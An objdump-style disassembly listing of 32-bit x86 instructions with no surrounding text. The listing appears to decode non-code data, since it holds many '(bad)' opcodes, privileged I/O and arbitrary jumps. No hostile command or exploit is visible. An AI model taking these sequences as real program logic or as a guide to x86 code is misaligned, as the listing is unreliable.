  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [eax+0xcfe473e],dh
  42d105:	loop   0x42d108
  42d107:	add    BYTE PTR [ecx+eax*1],al
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	retf   
  42d10d:	dec    esp
  42d10e:	push   DWORD PTR es:0x741563d6
  42d115:	arpl   WORD PTR [eax+0x7ea20c5d],bx
  42d11b:	cmp    dh,BYTE PTR [ebp-0x54]
  42d11e:	sub    al,0xbe
  42d120:	fdiv   DWORD PTR [eax+0x5]
  42d123:	push   esi
  42d124:	pop    edx
  42d125:	jmp    0x42d15f
  42d127:	jle    0x42d189
  42d129:	cmp    DWORD PTR [ecx-0x63],edi
  42d12c:	xchg   ebx,eax
  42d12d:	mov    bh,0x9c
  42d12f:	mov    edi,0x4433f2a7
  42d134:	mov    dh,BYTE PTR [ebp+edx*8+0x53f0283a]
  42d13b:	pop    edi
  42d13c:	push   ebx
  42d13d:	scas   eax,DWORD PTR es:[edi]
  42d13e:	pop    eax
  42d13f:	push   ebp
  42d140:	mov    eax,ds:0xa16b3d36
  42d145:	pop    ecx
  42d146:	scas   al,BYTE PTR es:[edi]
  42d147:	inc    eax
  42d148:	dec    edi
  42d149:	pop    esp
  42d14a:	(bad)  
  42d14b:	in     al,dx
  42d14c:	cmp    DWORD PTR [esi],esp
  42d14e:	popf   
  42d14f:	fld    DWORD PTR [edi-0x6c0ac13c]
  42d155:	ret    
  42d156:	not    cl
  42d158:	mov    dl,BYTE PTR [edx-0x78ccf9cf]
  42d15e:	arpl   WORD PTR [eax-0x10bd4e91],bp
  42d164:	dec    ecx
  42d165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d166:	lds    edi,FWORD PTR [edi]
  42d168:	iret   
  42d169:	mov    BYTE PTR [ebp-0x70],ah
  42d16c:	or     al,0x45
  42d16e:	and    BYTE PTR [ebp+edi*4-0x5c],ch
  42d172:	add    WORD PTR [ebx+0x72be1eb9],sp
  42d179:	pop    es
  42d17a:	fistp  DWORD PTR [edx]
  42d17c:	mov    eax,0x15daf6ad
  42d181:	mov    al,0xb3
  42d183:	sbb    BYTE PTR [ebp+eax*1+0x19],bh
  42d187:	xor    DWORD PTR [eax-0x259464bd],eax
  42d18d:	add    BYTE PTR [ebp-0x12],bl
  42d190:	scas   al,BYTE PTR es:[edi]
  42d191:	xor    DWORD PTR [ecx-0x3f],0x59
  42d195:	add    ch,bl
  42d197:	mov    esp,0xb84fc6a1
  42d19c:	dec    ebx
  42d19d:	inc    ebx
  42d19e:	mov    eax,0xcb60fb04
  42d1a3:	test   eax,0xb6c828a5
  42d1a8:	xchg   ebp,eax
  42d1a9:	shl    BYTE PTR [edi-0x5a12ee09],1
  42d1af:	push   ebx
  42d1b0:	jae    0x42d1d2
  42d1b2:	inc    ebp
  42d1b3:	retf   0xc47d
  42d1b6:	prefetcht0 BYTE PTR [edi-0x4cfd62d8]
  42d1bd:	xchg   ebx,eax
  42d1be:	push   edi
  42d1bf:	in     al,0x9b
  42d1c1:	adc    edi,ebx
  42d1c3:	push   0x9
  42d1c5:	jbe    0x42d1fa
  42d1c7:	cmp    al,0x76
  42d1c9:	aam    0x2e
  42d1cb:	test   al,0x7a
  42d1cd:	pop    ds
  42d1ce:	pusha  
  42d1cf:	in     al,dx
  42d1d0:	lods   eax,DWORD PTR ds:[esi]
  42d1d1:	push   0xffffff9e
  42d1d3:	sbb    dl,BYTE PTR [edi-0x5a169062]
  42d1d9:	or     DWORD PTR [ebp+0x19227483],edx
  42d1df:	sbb    BYTE PTR [ebx+ebp*4+0x5c4d9379],0xbd
  42d1e7:	xor    ebx,ebx
  42d1e9:	xor    dh,BYTE PTR [ecx-0x3d]
  42d1ec:	test   ah,0x79
  42d1ef:	inc    ebx
  42d1f0:	xchg   esi,eax
  42d1f1:	sub    DWORD PTR ds:0xb44fd544,edx
  42d1f7:	jnp    0x42d26a
  42d1f9:	(bad)  
  42d1fa:	fs sub eax,0x67be874
  42d200:	dec    edx
  42d201:	add    BYTE PTR [edx+ebp*1+0x1edaf354],dl
  42d208:	jmp    0x42d209
  42d20a:	fld    TBYTE PTR [ebx]
  42d20c:	outs   dx,DWORD PTR ds:[esi]
  42d20d:	out    0x74,eax
  42d20f:	mov    eax,ds:0x0
	...
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d25f
  42d281:	mov    al,0x30
  42d283:	aam    0x10
  42d285:	jecxz  0x42d288
  42d287:	add    BYTE PTR [ecx+eax*1],al
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	adc    BYTE PTR [eax-0x60],cl
  42d28f:	xor    eax,0x8bbd2f08
  42d294:	push   esp
  42d295:	packuswb mm5,mm2
  42d298:	xor    DWORD PTR [ebx],esi
  42d29a:	ficom  DWORD PTR [ecx-0x665e1f03]
  42d2a0:	xor    ebp,ebp
  42d2a2:	jmp    0x42d2c6
  42d2a4:	push   ebx
  42d2a5:	not    BYTE PTR [esi+0x5db6b963]
  42d2ab:	pop    ds
  42d2ac:	add    al,0x2a
  42d2ae:	stos   BYTE PTR es:[edi],al
  42d2af:	mov    WORD PTR [esi+0x481f3f70],gs
  42d2b5:	(bad)  
  42d2b6:	lods   eax,DWORD PTR ds:[esi]
  42d2b7:	cdq    
  42d2b8:	push   ebx
  42d2b9:	lock mov dl,0xd6
  42d2bc:	mov    ecx,0x577d3711
  42d2c1:	mov    DWORD PTR [edx+0x72],ebp
  42d2c4:	add    BYTE PTR [ecx+ebp*2],bl
  42d2c7:	add    al,0x91
  42d2c9:	adc    ebp,edi
  42d2cb:	inc    esi
  42d2cc:	push   ecx
  42d2cd:	sub    esp,eax
  42d2cf:	add    ecx,edx
  42d2d1:	daa    
  42d2d2:	add    esi,DWORD PTR [ecx+0x66]
  42d2d5:	outs   dx,BYTE PTR ds:[esi]
  42d2d6:	mov    esp,0x9657137e
  42d2db:	dec    edi
  42d2dc:	in     eax,dx
  42d2dd:	xor    bl,dl
  42d2df:	push   ss
  42d2e0:	add    al,0xc8
  42d2e2:	scas   al,BYTE PTR es:[edi]
  42d2e3:	pop    esi
  42d2e4:	xchg   DWORD PTR [ecx+0x2b],ebp
  42d2e7:	ret    0x6034
  42d2ea:	popa   
  42d2eb:	loope  0x42d35c
  42d2ed:	div    bh
  42d2ef:	pop    esp
  42d2f0:	arpl   WORD PTR [edx],di
  42d2f2:	in     al,0x94
  42d2f4:	and    eax,ebx
  42d2f6:	scas   al,BYTE PTR es:[edi]
  42d2f7:	data16 adc al,0xde
  42d2fa:	rcl    BYTE PTR es:[esi-0xe],cl
  42d2fe:	lods   al,BYTE PTR ds:[esi]
  42d2ff:	js     0x42d32f
  42d301:	and    BYTE PTR [edx+0x5002d4bc],cl
  42d307:	or     eax,0x37712b0e
  42d30c:	dec    esp
  42d30d:	push   ss
  42d30e:	data16 mov dh,0xf5
  42d311:	sti    
  42d312:	fimul  WORD PTR [esi+0x20016c85]
  42d318:	and    eax,0xd334c29e
  42d31d:	xor    DWORD PTR [esi],ebp
  42d31f:	mov    esi,0xec55f10a
  42d324:	es add esi,esp
  42d327:	test   DWORD PTR [ebp-0x131fd81b],ecx
  42d32d:	dec    ecx
  42d32e:	xchg   edx,eax
  42d32f:	sbb    al,ch
  42d331:	repnz test eax,0x2e7d863f
  42d337:	dec    edi
  42d338:	jp     0x42d2e2
  42d33a:	add    eax,0x4426c188
  42d33f:	out    0xd1,eax
  42d341:	or     bl,BYTE PTR [esi]
  42d343:	test   BYTE PTR ds:0x2d440ac,bh
  42d349:	push   es
  42d34a:	sub    DWORD PTR [ebp-0x5ce409a7],ecx
  42d350:	dec    edi
  42d351:	xor    eax,0x11c0bc80
  42d356:	mov    ecx,0x1b392145
  42d35b:	mov    edi,DWORD PTR [edx+0x13]
  42d35e:	pavgw  mm0,QWORD PTR [ebx+0x51a94cf9]
  42d365:	js     0x42d3e4
  42d367:	adc    DWORD PTR [eax+ebp*2-0x3e],0xa9e188a3
  42d36f:	pop    ecx
  42d370:	loopne 0x42d370
  42d372:	jns    0x42d3b4
  42d374:	icebp  
  42d375:	les    edx,FWORD PTR [ebp+0x461da8c5]
  42d37b:	push   ecx
  42d37c:	and    eax,0xd0f5a825
  42d381:	dec    ecx
  42d382:	pop    es
  42d383:	dec    edi
  42d384:	in     al,dx
  42d385:	pop    ebp
  42d386:	retf   0x6491
  42d389:	cmc    
  42d38a:	int3   
  42d38b:	inc    ebp
  42d38c:	xor    BYTE PTR [edx-0x4b],ah
  42d38f:	loop   0x42d391
	...
  42d3f1:	add    BYTE PTR [eax],al
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	popf   
  42d401:	sub    bh,BYTE PTR [eax+0x1e41468]
  42d407:	add    BYTE PTR [ecx+eax*1],al
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	jbe    0x42d41d
  42d40e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d40f:	out    0x26,al
  42d411:	stos   DWORD PTR es:[edi],eax
  42d412:	mov    esi,0xc44c91e6
  42d417:	xor    eax,0x8977866
  42d41c:	not    esp
  42d41e:	ret    0xdbfb
  42d421:	lahf   
  42d422:	into   
  42d423:	fbld   TBYTE PTR [esi-0x5cccff06]
  42d429:	clc    
  42d42a:	sub    DWORD PTR [eax+0x1f901208],edx
  42d430:	loope  0x42d4a8
  42d432:	out    dx,al
  42d433:	pop    ds
  42d434:	cmp    al,0x79
  42d436:	and    al,0x38
  42d438:	and    edi,0x40
  42d43b:	sti    
  42d43c:	mov    es,WORD PTR [ebx+0xd]
  42d43f:	and    ebp,DWORD PTR [edi-0x316153a6]
  42d445:	inc    edx
  42d446:	mov    ebp,0xc581899d
  42d44b:	jle    0x42d418
  42d44d:	inc    ebx
  42d44e:	arpl   WORD PTR [eax+0x49],sp
  42d451:	push   es
  42d452:	lods   al,BYTE PTR ds:[esi]
  42d453:	test   al,0x20
  42d455:	mov    cs,WORD PTR [ecx-0x5f]
  42d458:	mov    bl,0x3e
  42d45a:	loope  0x42d3de
  42d45c:	(bad)  
  42d45d:	sub    al,0x52
  42d45f:	mov    ebp,0x495dbd49
  42d464:	sbb    esp,DWORD PTR [esp+edx*2-0x37a8796d]
  42d46b:	xchg   esp,esi
  42d46d:	sahf   
  42d46e:	sbb    ebx,edx
  42d470:	shl    DWORD PTR [ebx+0x26c8b0ee],0x81
  42d477:	dec    esp
  42d478:	dec    edx
  42d479:	mov    esp,0x34157481
  42d47e:	cmp    ch,cl
  42d480:	ins    BYTE PTR es:[edi],dx
  42d481:	imul   ecx,DWORD PTR [esi],0xb470827b
  42d487:	pop    ds
  42d488:	call   DWORD PTR [edi-0x634bed69]
  42d48e:	std    
  42d48f:	sahf   
  42d490:	mov    al,BYTE PTR [eax-0x1c]
  42d493:	je     0x42d43e
  42d495:	jg     0x42d420
  42d497:	iret   
  42d498:	push   edi
  42d499:	(bad)  [ebx-0x49]
  42d49c:	xor    al,0xc4
  42d49e:	or     ebp,DWORD PTR [ebp+0x22]
  42d4a1:	sbb    BYTE PTR [ebp+0x3a],ch
  42d4a4:	stc    
  42d4a5:	int3   
  42d4a6:	outs   dx,DWORD PTR ds:[esi]
  42d4a7:	dec    ebx
  42d4a8:	cmp    ebx,0x35
  42d4ab:	xor    esi,eax
  42d4ad:	cmp    dh,bh
  42d4af:	sbb    eax,0x4cfc54d5
  42d4b4:	inc    edi
  42d4b5:	dec    ebp
  42d4b6:	scas   al,BYTE PTR es:[edi]
  42d4b7:	push   ebx
  42d4b8:	fst    st(0)
  42d4ba:	jo     0x42d48d
  42d4bc:	call   0x95b0:0x7a8c268c
  42d4c3:	shl    BYTE PTR ds:0x9f885ed0,cl
  42d4c9:	xor    cl,BYTE PTR [edx-0x10ee6bdf]
  42d4cf:	sbb    edi,DWORD PTR [esi-0x4c1d1679]
  42d4d5:	cmc    
  42d4d6:	jno    0x42d469
  42d4d8:	dec    ebp
  42d4d9:	je     0x42d4e9
  42d4db:	clc    
  42d4dc:	loope  0x42d4b0
  42d4de:	xor    bl,BYTE PTR [eax-0x6d4134a9]
  42d4e4:	jo     0x42d478
  42d4e6:	push   esp
  42d4e7:	or     bh,BYTE PTR ds:0x58e37d74
  42d4ed:	mov    eax,0xe7c91276
  42d4f2:	inc    eax
  42d4f3:	push   cs
  42d4f4:	cld    
  42d4f5:	fimul  DWORD PTR [edx-0x23]
  42d4f8:	cmp    DWORD PTR [edx+0x9f471a3],eax
  42d4fe:	(bad)  
  42d4ff:	and    al,0x7
  42d501:	stc    
  42d502:	mov    eax,ds:0x657ea6b7
  42d507:	ja     0x42d531
  42d509:	inc    edi
  42d50a:	aad    0xa5
  42d50c:	inc    ebx
  42d50d:	stc    
  42d50e:	outs   dx,BYTE PTR ds:[esi]
  42d50f:	fiadd  WORD PTR [eax]
	...
  42d571:	add    BYTE PTR [eax],al
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0x498925d5,eax
  42d583:	inc    esp
  42d584:	sbb    ch,ah
  42d586:	add    DWORD PTR [eax],eax
  42d588:	add    al,0x1
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d58d:	leave  
  42d58e:	ret    
  42d58f:	fwait
  42d590:	loopne 0x42d544
  42d592:	jae    0x42d60e
  42d594:	xchg   ecx,eax
  42d595:	fs out 0x6f,al
  42d598:	mov    WORD PTR [esp+esi*2],cs
  42d59b:	icebp  
  42d59c:	push   edx
  42d59d:	enter  0xb96e,0x1c
  42d5a1:	or     al,ah
  42d5a3:	pop    esi
  42d5a4:	push   cs
  42d5a5:	mov    cl,0xcb
  42d5a7:	adc    al,0x6a
  42d5a9:	or     BYTE PTR [esi+edi*1],cl
  42d5ac:	push   0x4e6083dd
  42d5b1:	mov    ebx,0xdb88c9d4
  42d5b6:	or     DWORD PTR [ebx+0x3c],esi
  42d5b9:	jmp    0xe83000fe
  42d5be:	inc    esi
  42d5bf:	push   ebx
  42d5c0:	std    
  42d5c1:	cld    
  42d5c2:	mov    dl,dh
  42d5c4:	xchg   ebx,eax
  42d5c5:	pop    sp
  42d5c7:	addr16 jns 0x42d60a
  42d5ca:	inc    eax
  42d5cb:	adc    DWORD PTR [ebx+esi*8],0x5d0f30d5
  42d5d2:	test   al,0xf
  42d5d4:	jecxz  0x42d5da
  42d5d6:	push   es
  42d5d7:	jl     0x42d5d9
  42d5d9:	int    0x1f
  42d5db:	repnz xlat BYTE PTR gs:[ebx]
  42d5de:	xor    cl,BYTE PTR [ecx-0x78]
  42d5e1:	sub    ebx,DWORD PTR [ebp+0x35]
  42d5e4:	imul   esi,DWORD PTR [edi],0xffffff83
  42d5e7:	sub    eax,0x26bcd97d
  42d5ec:	jmp    0x42d66b
  42d5ee:	fnstsw WORD PTR [ebx+edi*4]
  42d5f1:	in     eax,0xea
  42d5f3:	addr16 push ebp
  42d5f5:	lods   eax,DWORD PTR ds:[esi]
  42d5f6:	mov    DWORD PTR [ebx+0x58],edx
  42d5f9:	jb     0x42d60d
  42d5fb:	scas   eax,DWORD PTR es:[edi]
  42d5fc:	adc    eax,0xb6d61ac5
  42d601:	jge    0x42d5e6
  42d603:	cmc    
  42d604:	outs   dx,BYTE PTR ds:[esi]
  42d605:	rcr    DWORD PTR [esi-0x3144de07],cl
  42d60b:	and    bl,bl
  42d60d:	cmc    
  42d60e:	xchg   ebp,eax
  42d60f:	mov    ds:0xffcc68c7,al
  42d614:	iret   
  42d615:	adc    BYTE PTR [edx],0x39
  42d618:	inc    eax
  42d619:	call   0x3f54:0x1005211b
  42d620:	div    BYTE PTR [edx]
  42d622:	push   edx
  42d623:	push   es
  42d624:	jp     0x42d610
  42d626:	jge    0x42d69a
  42d628:	adc    al,0xb6
  42d62a:	push   esi
  42d62b:	mov    dl,0x20
  42d62d:	add    BYTE PTR [edi+0x61f42aa7],ah
  42d633:	and    eax,0xdeae3f73
  42d638:	add    ebx,DWORD PTR [eax+0x58161b2b]
  42d63e:	test   DWORD PTR [esi-0x39],eax
  42d641:	or     ebx,esi
  42d643:	ret    
  42d644:	pop    ds
  42d645:	(bad)  
  42d646:	push   edi
  42d647:	shr    ah,1
  42d649:	jg     0x42d65d
  42d64b:	icebp  
  42d64c:	rep ins BYTE PTR es:[edi],dx
  42d64e:	sub    al,0x70
  42d650:	mov    BYTE PTR [eax+0x12],cl
  42d653:	inc    esi
  42d654:	and    ah,bl
  42d656:	and    eax,0x728121ec
  42d65b:	ret    
  42d65c:	ins    DWORD PTR es:[edi],dx
  42d65d:	ss dec ecx
  42d65f:	mov    eax,ebx
  42d661:	jge    0x42d5fe
  42d663:	and    eax,0xc2f39908
  42d668:	imul   eax,edi,0x11303d17
  42d66e:	pusha  
  42d66f:	imul   esi,DWORD PTR [edx+0x18f1cfac],0x5c4795f1
  42d679:	mov    eax,fs:0xb6885ebf
  42d67f:	aam    0xcd
  42d681:	and    ebx,DWORD PTR [eax+ecx*2]
  42d684:	call   DWORD PTR [esi+0x49e6b132]
  42d68a:	fs push ss
  42d68c:	pop    ebx
  42d68d:	or     eax,0x89bf
	...
  42d6f2:	add    BYTE PTR [eax],al
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xc7
  42d701:	or     BYTE PTR [esi+0x35],dh
  42d704:	sbb    al,0xe6
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    al,0x1
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	mov    al,bh
  42d70e:	ins    BYTE PTR es:[edi],dx
  42d70f:	push   ds
  42d710:	arpl   WORD PTR [ecx-0x518b16fb],cx
  42d716:	cmp    al,0xc3
  42d718:	pop    edx
  42d719:	es out dx,eax
  42d71b:	cmp    ah,BYTE PTR [edi]
  42d71d:	adc    DWORD PTR [edx],esi
  42d71f:	pop    ds
  42d720:	fsub   QWORD PTR [ebx]
  42d722:	pop    edx
  42d723:	xor    BYTE PTR [edi+ebp*8-0x4a],ah
  42d727:	sub    eax,ebx
  42d729:	mov    edx,0xaa5c9a9d
  42d72e:	lahf   
  42d72f:	cmp    cl,BYTE PTR [ecx+edx*4-0x1]
  42d733:	imul   ecx,edx,0x0
  42d736:	mov    ebp,0xa3bf9471
  42d73b:	out    dx,eax
  42d73c:	cld    
  42d73d:	mov    WORD PTR [edi-0x7f],es
  42d740:	enter  0xbfc2,0x70
  42d744:	les    edi,FWORD PTR [esi]
  42d746:	sar    esi,cl
  42d748:	xchg   edi,eax
  42d749:	dec    eax
  42d74a:	dec    edi
  42d74b:	mov    dh,0xc8
  42d74d:	jp     0x42d6e2
  42d74f:	jle    0x42d711
  42d751:	ins    DWORD PTR es:[edi],dx
  42d752:	jb     0x42d742
  42d754:	lds    esp,FWORD PTR [edi-0xa5a47c6]
  42d75a:	mov    ebp,0x2e54f751
  42d75f:	ins    BYTE PTR es:[edi],dx
  42d760:	ja     0x42d779
  42d762:	das    
  42d763:	(bad)  
  42d764:	dec    edx
  42d765:	mov    ds:0x1ead5bf5,eax
  42d76a:	repnz shl edi,cl
  42d76d:	push   cs
  42d76e:	mov    ebp,0x9b9ea71c
  42d773:	or     eax,0xab36ba8b
  42d778:	dec    ebx
  42d779:	test   al,0x2b
  42d77b:	xchg   esp,eax
  42d77c:	jmp    0xb2d2:0x720a519e
  42d783:	push   eax
  42d784:	xor    eax,0x19c2d872
  42d789:	xchg   edi,eax
  42d78a:	fdiv   QWORD PTR [edx-0x771a0353]
  42d790:	cmp    BYTE PTR [edi],ch
  42d792:	and    eax,0x6d652289
  42d797:	repnz push es
  42d799:	stos   DWORD PTR es:[edi],eax
  42d79a:	pop    esp
  42d79b:	call   0xd9b49a81
  42d7a0:	lea    esi,[ebx+0x27910809]
  42d7a6:	pop    edi
  42d7a7:	xchg   esp,eax
  42d7a8:	push   ebx
  42d7a9:	push   ss
  42d7aa:	in     eax,dx
  42d7ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d7ac:	cmp    ecx,esp
  42d7ae:	cmp    esi,edx
  42d7b0:	or     eax,0xd622c5f1
  42d7b5:	xchg   ebp,eax
  42d7b6:	push   0x12
  42d7b8:	cmp    al,0x27
  42d7ba:	stc    
  42d7bb:	dec    ecx
  42d7bc:	jg     0x42d81f
  42d7be:	push   ss
  42d7bf:	xchg   ebp,eax
  42d7c0:	mov    al,0x30
  42d7c2:	fsub   DWORD PTR [esi]
  42d7c4:	dec    edx
  42d7c5:	lds    ebp,FWORD PTR [ebx+ebx*8-0x77]
  42d7c9:	icebp  
  42d7ca:	les    ebp,FWORD PTR [edi-0x77]
  42d7cd:	dec    edi
  42d7ce:	fsub   QWORD PTR [edx+ebp*8-0x2b6086b4]
  42d7d5:	out    dx,al
  42d7d6:	fild   DWORD PTR [ebx+0x78]
  42d7d9:	outs   dx,DWORD PTR ds:[esi]
  42d7da:	push   0xffffffb9
  42d7dc:	nop
  42d7dd:	ss or  eax,0xe5e62d63
  42d7e3:	pmaddwd mm5,QWORD PTR [ebx+0x3eeb118c]
  42d7ea:	or     BYTE PTR [eax+0x270054d3],0x55
  42d7f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d7f2:	out    dx,al
  42d7f3:	sbb    ebp,DWORD PTR [ecx+ebx*2]
  42d7f6:	mov    dl,0x13
  42d7f8:	push   edi
  42d7f9:	jge    0x42d873
  42d7fb:	or     ah,BYTE PTR [edx-0x6e]
  42d7fe:	and    DWORD PTR [edx+0x57c82edd],edi
  42d804:	mov    ah,0x97
  42d806:	into   
  42d807:	fucom  st(3)
  42d809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d80a:	or     BYTE PTR [ebp-0x61e7d2af],bh
	...
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0xdbc6961a
  42d881:	and    DWORD PTR [ecx],ebp
  42d883:	shl    DWORD PTR [eax],cl
  42d885:	out    0x1,eax
  42d887:	add    BYTE PTR [ecx+eax*1],al
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	out    dx,eax
  42d88d:	shl    BYTE PTR [ebp+0x43e84151],1
  42d893:	dec    esi
  42d894:	mov    esp,0xffae049
  42d899:	imul   esi,DWORD PTR [esi],0xa6c1d59a
  42d89f:	mov    ecx,edx
  42d8a1:	dec    ebp
  42d8a2:	pop    ds
  42d8a3:	cdq    
  42d8a4:	enter  0x661d,0x8
  42d8a8:	pop    edi
  42d8a9:	popa   
  42d8aa:	fcom   DWORD PTR ds:0x3069300a
  42d8b0:	stos   BYTE PTR es:[edi],al
  42d8b1:	daa    
  42d8b2:	adc    al,0x12
  42d8b4:	and    bl,dh
  42d8b6:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  42d8b8:	fisttp DWORD PTR [ecx+0x1e88f5fb]
  42d8be:	adc    BYTE PTR [edi+0x70],dh
  42d8c1:	pop    ecx
  42d8c2:	add    ah,BYTE PTR [ebx]
  42d8c4:	cld    
  42d8c5:	dec    esi
  42d8c6:	or     BYTE PTR [edi],dl
  42d8c8:	stc    
  42d8c9:	sub    BYTE PTR [ebx+0x5d70e10b],bl
  42d8cf:	cli    
  42d8d0:	cmp    dh,BYTE PTR [esi-0xa399062]
  42d8d6:	sub    al,BYTE PTR [ebx+0x6d71d90e]
  42d8dc:	sub    BYTE PTR [ebp+0x2de7b29b],al
  42d8e2:	dec    edx
  42d8e3:	jg     0x42d925
  42d8e5:	jecxz  0x42d8e7
  42d8e7:	dec    esi
  42d8e8:	dec    edi
  42d8e9:	hlt    
  42d8ea:	adc    ecx,ecx
  42d8ec:	rcr    BYTE PTR [edi+0x9],0x95
  42d8f0:	push   0x27563798
  42d8f5:	and    eax,0x30eccf93
  42d8fa:	and    al,0xa8
  42d8fc:	dec    edx
  42d8fd:	das    
  42d8fe:	adc    al,0x7a
  42d900:	sbb    edx,0xffffffb9
  42d903:	jle    0x42d941
  42d905:	cwde   
  42d906:	dec    ebx
  42d907:	loop   0x42d8b4
  42d909:	shl    DWORD PTR ds:0x122d317c,0xf5
  42d910:	daa    
  42d911:	stc    
  42d912:	or     edx,DWORD PTR [ebx-0x40]
  42d915:	pop    ebp
  42d916:	pushf  
  42d917:	ins    BYTE PTR es:[edi],dx
  42d918:	int    0xf9
  42d91a:	test   al,0x19
  42d91c:	sbb    al,0x9a
  42d91e:	stos   BYTE PTR es:[edi],al
  42d91f:	mov    BYTE PTR [ecx+0x549feb98],cl
  42d925:	mov    cl,0x29
  42d927:	sbb    al,0xd5
  42d929:	pop    ebx
  42d92a:	or     eax,0x6a6b3d84
  42d92f:	adc    DWORD PTR [esi+0x3e9ce801],ecx
  42d935:	pop    eax
  42d936:	sub    eax,DWORD PTR [ecx]
  42d938:	sahf   
  42d939:	scas   al,BYTE PTR es:[edi]
  42d93a:	jae    0x42d91e
  42d93c:	iret   
  42d93d:	jmp    0x7551:0x26b02f0d
  42d944:	leave  
  42d945:	mov    ecx,0xa3650225
  42d94a:	je     0x42d8ea
  42d94c:	sti    
  42d94d:	add    edx,edi
  42d94f:	lock dec edx
  42d951:	inc    ecx
  42d952:	xor    al,0xe2
  42d954:	outs   dx,BYTE PTR ds:[esi]
  42d955:	push   ebp
  42d956:	adc    DWORD PTR [eax+0x1f],esp
  42d959:	pop    edi
  42d95a:	pop    ebx
  42d95b:	pop    ds
  42d95c:	pop    edi
  42d95d:	pop    edi
  42d95e:	xor    ebp,DWORD PTR [ebx+0x16d391ea]
  42d964:	sub    eax,0xf4988cd4
  42d969:	(bad)  [ebx+ebp*1]
  42d96c:	div    ch
  42d96e:	mov    esp,0xb2b55904
  42d973:	cli    
  42d974:	inc    edi
  42d975:	fucomip st,st(4)
  42d977:	xor    BYTE PTR [eax+0x33bae08e],bh
  42d97d:	pop    ebx
  42d97e:	loope  0x42d995
  42d980:	mov    ebp,0xf0dc4eb0
  42d985:	mov    ebp,0x46698edd
  42d98a:	adc    eax,0xb25d277c
  42d98f:	jno    0x42d991
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	or     ah,BYTE PTR [edx+0x2f]
  42da03:	fbld   TBYTE PTR [eax+ebp*8]
  42da06:	add    DWORD PTR [eax],eax
  42da08:	add    al,0x1
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	lods   al,BYTE PTR ds:[esi]
  42da0d:	out    0xe5,al
  42da0f:	cmp    al,BYTE PTR [ecx-0x67]
  42da12:	or     eax,0x8523f330
  42da17:	or     BYTE PTR [ebx+0x4a],al
  42da1a:	cmp    eax,DWORD PTR [ebp-0x34]
  42da1d:	xchg   edi,eax
  42da1e:	xor    al,0x83
  42da20:	lahf   
  42da21:	pop    edx
  42da22:	mov    edx,0x597f2a34
  42da27:	es clc 
  42da29:	bound  ebp,QWORD PTR [si+0x4c32]
  42da2e:	sub    eax,0xa4bd8559
  42da33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da34:	(bad)  
  42da35:	sbb    ch,BYTE PTR [ebp-0x58]
  42da38:	sti    
  42da39:	outs   dx,DWORD PTR ds:[esi]
  42da3a:	dec    edx
  42da3b:	aam    0xa5
  42da3d:	push   esi
  42da3e:	dec    esi
  42da3f:	dec    esp
  42da40:	jae    0x42da9d
  42da42:	dec    edi
  42da43:	retf   
  42da44:	adc    eax,0xb4d1aa80
  42da49:	dec    edi
  42da4a:	adc    dl,BYTE PTR [ecx-0x26]
  42da4d:	in     eax,0x7d
  42da4f:	pushf  
  42da50:	addr16 add eax,0xa9a4b4f6
  42da56:	mov    esp,0x621fee69
  42da5b:	inc    di
  42da5d:	and    dl,BYTE PTR [esi]
  42da5f:	lea    ebp,[eax+0x34]
  42da62:	push   edx
  42da63:	neg    BYTE PTR [ecx]
  42da65:	mov    gs,esi
  42da67:	js     0x42da55
  42da69:	add    bl,dl
  42da6b:	fiadd  WORD PTR [eax-0x371bbc13]
  42da71:	jmp    0x951c8f79
  42da76:	out    0x6,eax
  42da78:	loopne 0x42da7b
  42da7a:	call   0x49e25193
  42da7f:	sbb    eax,0x6498e89a
  42da84:	push   0xc242862f
  42da89:	dec    edi
  42da8a:	gs jnp 0x42da4e
  42da8d:	mov    eax,0xb2606f87
  42da92:	rcl    BYTE PTR [edx],0xcf
  42da95:	test   BYTE PTR [ecx+0x37],bh
  42da98:	mov    ebp,0x92bfa406
  42da9d:	xlat   BYTE PTR ds:[ebx]
  42da9e:	or     DWORD PTR [edi+0x53],edx
  42daa1:	sub    ecx,0xffffffd2
  42daa4:	push   ss
  42daa5:	push   sp
